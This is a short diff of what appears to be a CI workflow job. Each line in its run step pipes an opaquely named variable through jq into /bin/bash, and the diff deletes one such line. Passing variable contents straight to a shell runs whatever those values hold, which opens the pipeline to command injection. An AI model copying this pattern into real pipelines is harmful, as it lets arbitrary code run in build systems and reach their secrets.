@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$juh22" | jq -r .ihh160 | /bin/bash
           echo $ut257 | jq -r .zscf82163 | /bin/bash
-          echo $agklk20 | jq -r .wuuuy43 | /bin/bash
           echo $ipcti36333 | jq -r .ybp5247 | /bin/bash
           printf '%s' "$n360" | jq -r .vpceb801 | /bin/bash
 
